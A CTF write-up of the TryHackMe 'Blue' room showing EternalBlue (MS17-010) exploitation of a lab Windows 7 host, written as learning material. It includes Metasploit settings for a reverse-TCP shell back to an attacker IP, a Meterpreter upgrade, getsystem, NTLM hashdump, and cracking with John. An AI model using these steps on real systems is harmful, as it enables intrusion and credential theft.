# TryHackMe — Blue WriteUp
<img width="1063" height="699" alt="image" src="https://github.com/user-attachments/assets/3d612c0f-9ebd-478d-ad42-298d25cb1c01" />

**Room**: [Blue](https://tryhackme.com/room/blue) <br>
**Category**: Exploitation of SMB & Windows <br>
**Description**: Demonstrate EternalBlue exploitation on a vulnerable Windows host.



## Tools
- **Nmap** (service/OS and vulnerability scripts)
- **Metasploit** (exploit and post modules)
- **John** (password cracking)


## Target
IP: `10.201.74.172` (exported as an environment variable for convenience)
```bash
# Set target IP for easier command reuse
export IP=10.201.74.172
```


# Task 1: Recon

To start I performed an Nmap scan to identify open ports, services, and potential vulnerabilities:
```bash
nmap -sV -sC -sS -T4 --script vuln $IP
```

<img width="619" height="568" alt="Pasted image 20250923144301" src="https://github.com/user-attachments/assets/0c4f7be7-0ddb-4aff-89dd-aad401894ba3" />

**Nmap scan findings**:
- Port 445 open and using `microsoft-ds` (SMB)
- OS fingerprint: Windows 7 Professional
- Nmap script reported the host as vulnerable to **ms17-010** (EternalBlue)
**Answers (TryHackMe)**
- Number of open ports under 1000: **3**
- Vulnerability identified: **ms17-010**


# Task 2: Gain Access 
Metasploit has a module for this exploit, so I started Metasploit to exploit MS17-010.

1. Search and select the EternalBlue module:
```bash
exploit/windows/smb/ms17_010_eternalblue
```

<img width="978" height="739" alt="Pasted image 20250923145316" src="https://github.com/user-attachments/assets/a67ed15f-a3ca-490d-8962-caaa24f87037" />

<br><br>

I selected the first module and ran `show options`:
<img width="985" height="486" alt="Pasted image 20250923145833" src="https://github.com/user-attachments/assets/a73ceab8-8cdf-4763-acb5-fcc387ceeb61" />


I set the required options:
```bash
set RHOSTS 10.201.74.172
set LHOST <attacker_IP>
set payload windows/x64/shell/reverse_tcp

#replace <attacker_IP> to my IP
```

**Result:** Then I ran with these options set. It was a successful exploitation and a shell was obtained:
<img width="934" height="95" alt="Pasted image 20250923153221" src="https://github.com/user-attachments/assets/0bfd84d3-a559-4d42-a034-2e2c1c83fa55" />


# Task 3: Escalate
Next I upgraded the shell to a Meterpreter. I backgrounded the previously gained shell (CTRL+Z):
<img width="544" height="83" alt="Pasted image 20250923153422" src="https://github.com/user-attachments/assets/263f3f3e-d946-4fd6-8f41-40eeb7a7e2eb" />


I searched shell_to_meterpreter and it shows in the results:
<img width="963" height="802" alt="Pasted image 20250923153739" src="https://github.com/user-attachments/assets/21e849c6-9faf-46da-9f4e-2fdbbb63fcc2" />


I select:
```bash
post/multi/manage/shell_to_meterpreter
```

and set SESSION to 1: <br>
<img width="826" height="616" alt="Pasted image 20250923153855" src="https://github.com/user-attachments/assets/c89ce434-faad-42de-8e42-9638bcefcf06" />


<img width="629" height="205" alt="Pasted image 20250923154135" src="https://github.com/user-attachments/assets/8a94feb0-15b4-495e-a988-39b4322613a6" /><br><br>


After converting, I ran:
- `sysinfo` to confirm target OS and session info
- `getsystem` and `getuid` to verify SYSTEM privileges 

<img width="556" height="404" alt="Pasted image 20250923155633" src="https://github.com/user-attachments/assets/0d08976c-a06a-4dae-b9de-b4a866948814" /> <br><br>

I reviewed running processes and targeted `lsass` (a common process to extract credentials when privileged):
<img width="572" height="395" alt="Pasted image 20250923161119" src="https://github.com/user-attachments/assets/8f385381-98fd-440b-acb1-3f0a862b847a" /> 


# Task 4: Cracking
Next I run the command 'hashdump' and retrieved NTLM hashes for `Administrator`, `Guest`, and `Jon`:
<img width="658" height="62" alt="Pasted image 20250923161335" src="https://github.com/user-attachments/assets/d234db07-951c-498e-b64b-ba09ec17af64" />


In another terminal I saved `Jon`'s NTLM hash to a file and cracked it with John:
```bash
john hashes.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
```

<img width="722" height="475" alt="Pasted image 20250923162748" src="https://github.com/user-attachments/assets/4c6f58f7-e4fa-4925-9c69-c4ab498a3659" />


**Cracked password for Jon:** `alqfna22`

With that password I authenticated and accessed the filesystem to retrieve flags:

First flag located at `C:\flag1.txt`<br>
<img width="581" height="503" alt="Pasted image 20250923164710" src="https://github.com/user-attachments/assets/8a16fba6-def3-4eb4-8b30-1653512aa3ee" />


The next flag was located at `C:\Windows\System32\config\flag2.txt`<br>
<img width="521" height="545" alt="Pasted image 20250923164410" src="https://github.com/user-attachments/assets/69557cf2-1235-4c2d-9574-f567fc6e4983" />


Third (final) flag found in user Jon's directory: `C:\Users\Jon\Documents\flag3.txt`<br>
<img width="513" height="2051" alt="Pasted image 20250923165329" src="https://github.com/user-attachments/assets/74a2abb9-3824-4a1a-8188-7c0afda33c43" />


# Takeaways
- **EternalBlue** targets SMBv1 and can allow remote code execution on unpatched Windows systems.
- **Nmap scripts** (like `--script vuln` used in this CTF) are effective for quickly identifying vulnerable services during reconnaissance.
- **Metasploit** provides modules for exploitation and post-exploitation automation (shell to meterpreter, privilege checks, hash dumping). 
- **Credential harvesting and offline cracking** (hashdump → John) is a practical escalation path on Windows systems with weak passwords.
- **Older and widely-known exploits** are useful for labs and CTFs because they demonstrate exploitation methodology in its simplest form.
- **Patching** is essential.
